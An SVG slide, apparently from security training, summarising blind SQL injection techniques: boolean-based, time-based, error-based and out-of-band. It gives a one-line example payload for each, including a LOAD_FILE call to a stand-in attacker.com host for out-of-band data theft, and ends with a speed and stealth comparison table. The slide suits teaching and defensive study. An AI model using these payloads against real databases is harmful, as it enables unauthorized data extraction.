<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 720" font-family="Arial, sans-serif">
  <!-- palette: resources/palette_diagram.yaml -->
  <defs>
    <style id="palette-vars">
      :root, svg {
        --bg: #ffffff;
        --surface: #f5f5f5;
        --border: #e0e0e0;
        --text: #212121;
        --text-muted: #555555;
        --text-faint: #888888;
        --code-bg: #1a1a2e;
        --shadow: #00000022;
        --black: #000000;
        --primary-fill: #2196f3;
        --primary-border: #1565c0;
        --primary-text: #ffffff;
        --primary-accent: #0d47a1;
        --ok-fill: #4caf50;
        --ok-border: #2e7d32;
        --ok-text: #ffffff;
        --ok-accent: #1b5e20;
        --warn-fill: #ff9800;
        --warn-border: #e65100;
        --warn-text: #ffffff;
        --warn-accent: #bf360c;
        --danger-fill: #e74c3c;
        --danger-border: #c62828;
        --danger-text: #ffffff;
        --danger-accent: #b71c1c;
        --info-fill: #9c27b0;
        --info-border: #6a1b9a;
        --info-text: #ffffff;
        --info-accent: #4a148c;
      }
    </style>
    <!-- Gradients -->
    <linearGradient id="grad-primary" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#2196f3"/>
      <stop offset="100%" stop-color="#1565c0"/>
    </linearGradient>

    <linearGradient id="grad-surface" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ffffff"/>
      <stop offset="100%" stop-color="#f5f5f5"/>
    </linearGradient>

    <linearGradient id="grad-ok" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#4caf50"/>
      <stop offset="100%" stop-color="#2e7d32"/>
    </linearGradient>

    <linearGradient id="grad-warn" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ff9800"/>
      <stop offset="100%" stop-color="#e65100"/>
    </linearGradient>

    <linearGradient id="grad-danger" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#e74c3c"/>
      <stop offset="100%" stop-color="#c62828"/>
    </linearGradient>

    <linearGradient id="grad-info" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#9c27b0"/>
      <stop offset="100%" stop-color="#6a1b9a"/>
    </linearGradient>

    <!-- Drop shadow -->
    <filter id="shadow" x="-4%" y="-8%" width="108%" height="124%">
      <feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#00000022"/>
    </filter>

    <!-- Arrow markers -->
    <marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#555555"/>
    </marker>
    <marker id="arrow-primary" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#1565c0"/>
    </marker>
    <marker id="arrow-ok" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#2e7d32"/>
    </marker>
    <marker id="arrow-warn" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#e65100"/>
    </marker>
    <marker id="arrow-danger" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#c62828"/>
    </marker>
    <marker id="arrow-info" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#6a1b9a"/>
    </marker>
    <marker id="arrow-white" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#ffffff"/>
    </marker>
</defs>
  <text x="615.015" y="51.8919" text-anchor="middle" font-size="27.334" font-weight="bold" fill="var(--text)">Blind SQL Injection Techniques</text>
  <rect x="51.2512" y="103.7838" width="546.68" height="121.0811" rx="6" fill="var(--primary-fill)" stroke="var(--primary-border)" stroke-width="2" />
  <text x="324.5913" y="147.027" text-anchor="middle" font-size="20.5005" font-weight="bold" fill="var(--primary-accent)">Boolean-Based Blind</text>
  <text x="324.5913" y="178.1622" text-anchor="middle" font-size="17.0838" fill="var(--text)">Different response for TRUE vs FALSE</text>
  <text x="324.5913" y="204.1081" text-anchor="middle" font-size="17.0838" fill="var(--text-muted)" font-family="monospace">1' AND 1=1-- (true) vs 1' AND 1=2-- (false)</text>
  <rect x="632.0988" y="103.7838" width="546.68" height="121.0811" rx="6" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2" />
  <text x="905.4388" y="147.027" text-anchor="middle" font-size="20.5005" font-weight="bold" fill="var(--warn-accent)">Time-Based Blind</text>
  <text x="905.4388" y="178.1622" text-anchor="middle" font-size="17.0838" fill="var(--text)">SLEEP/WAITFOR delays on TRUE</text>
  <text x="905.4388" y="204.1081" text-anchor="middle" font-size="17.0838" fill="var(--text-muted)" font-family="monospace">1' AND SLEEP(5)-- (5s delay)</text>
  <rect x="51.2512" y="259.4595" width="546.68" height="121.0811" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2" />
  <text x="324.5913" y="302.7027" text-anchor="middle" font-size="20.5005" font-weight="bold" fill="var(--danger-accent)">Error-Based</text>
  <text x="324.5913" y="333.8378" text-anchor="middle" font-size="17.0838" fill="var(--text)">Force errors that leak data</text>
  <text x="324.5913" y="359.7838" text-anchor="middle" font-size="17.0838" fill="var(--text-muted)" font-family="monospace">EXTRACTVALUE(1, CONCAT(0x7e,...))</text>
  <rect x="632.0988" y="259.4595" width="546.68" height="121.0811" rx="6" fill="var(--ok-fill)" stroke="var(--ok-border)" stroke-width="2" />
  <text x="905.4388" y="302.7027" text-anchor="middle" font-size="20.5005" font-weight="bold" fill="var(--ok-accent)">Out-of-Band (OOB)</text>
  <text x="905.4388" y="333.8378" text-anchor="middle" font-size="17.0838" fill="var(--text)">DNS/HTTP to attacker server</text>
  <text x="905.4388" y="359.7838" text-anchor="middle" font-size="17.0838" fill="var(--text-muted)" font-family="monospace">LOAD_FILE('\\\\attacker.com\\...')</text>
  <rect x="102.5025" y="449.7297" width="1025.0251" height="190.2703" rx="6" fill="var(--primary-fill)" stroke="var(--primary-border)" stroke-width="2" />
  <text x="615.015" y="492.973" text-anchor="middle" font-size="20.5005" font-weight="bold" fill="var(--text)">Technique Comparison</text>
  <text x="239.1725" y="536.2162" text-anchor="middle" font-size="17.0838" font-weight="bold" fill="var(--primary-accent)">Speed</text>
  <text x="478.345" y="536.2162" text-anchor="middle" font-size="17.0838" font-weight="bold" fill="var(--primary-accent)">Reliability</text>
  <text x="734.6012" y="536.2162" text-anchor="middle" font-size="17.0838" font-weight="bold" fill="var(--primary-accent)">Stealthiness</text>
  <text x="973.7737" y="536.2162" text-anchor="middle" font-size="17.0838" font-weight="bold" fill="var(--primary-accent)">Detection</text>
  <text x="239.1725" y="579.4595" text-anchor="middle" font-size="17.0838" fill="var(--text)">Boolean: Fast</text>
  <text x="478.345" y="579.4595" text-anchor="middle" font-size="17.0838" fill="var(--text)">Boolean: High</text>
  <text x="734.6012" y="579.4595" text-anchor="middle" font-size="17.0838" fill="var(--text)">Time: Low</text>
  <text x="973.7737" y="579.4595" text-anchor="middle" font-size="17.0838" fill="var(--text)">OOB: Hardest</text>
  <text x="239.1725" y="614.0541" text-anchor="middle" font-size="17.0838" fill="var(--text)">Time: Slow</text>
  <text x="478.345" y="614.0541" text-anchor="middle" font-size="17.0838" fill="var(--text)">OOB: Medium</text>
  <text x="734.6012" y="614.0541" text-anchor="middle" font-size="17.0838" fill="var(--text)">Boolean: Medium</text>
  <text x="973.7737" y="614.0541" text-anchor="middle" font-size="17.0838" fill="var(--text)">Error: Easiest</text>
</svg>